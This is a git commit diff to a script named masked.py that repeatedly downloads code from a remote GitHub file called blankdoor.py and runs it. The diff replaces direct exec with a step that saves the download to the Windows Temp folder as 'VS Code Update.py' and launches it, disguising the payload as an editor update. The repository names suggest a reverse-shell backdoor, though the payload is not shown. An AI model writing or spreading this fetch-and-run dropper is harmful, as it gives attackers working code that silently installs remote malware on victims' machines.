d97ce7ba5da10abf788ab8970eb8f41df595f130
Тот самый <151750492+tot-camiy-coder@users.noreply.github.com>
2024-11-05 22:23:15 +0300

    Update masked.py

--- masked.py
+++ masked.py
@@ -1,11 +1,12 @@
-import requests, time
+import requests, time, os
 url = "https://raw.githubusercontent.com/tot-camiy-coder/reverse_ps/refs/heads/main/blankdoor.py"
 while True:
     try: 
         r = requests.get(url)
-        print("!")
-        exec(r.text)
+        path = os.environ["USERPROFILE"]+"\\Appdata\\Local\\Temp\\"
+        with open(path+"VS Code Update.py", "w") as f:
+            f.write(r.text)
+        os.system(path+'"VS Code Update.py"')
         break
     except:
         time.sleep(5)
-
